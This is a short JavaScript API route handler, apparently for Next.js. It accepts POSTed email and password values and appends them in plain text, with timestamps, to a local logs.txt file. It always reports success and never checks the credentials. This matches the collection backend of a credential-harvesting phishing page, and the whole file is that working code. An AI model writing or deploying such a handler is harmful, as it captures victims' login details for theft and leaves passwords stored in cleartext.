import fs from 'fs'
import path from 'path'

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body

    const logPath = path.join(process.cwd(), 'logs.txt')
    const logEntry = `${new Date().toISOString()} | ${email} | ${password}\n`

    fs.appendFileSync(logPath, logEntry, 'utf8')
    return res.status(200).json({ success: true })
  }

  return res.status(405).json({ error: 'Method not allowed' })
}
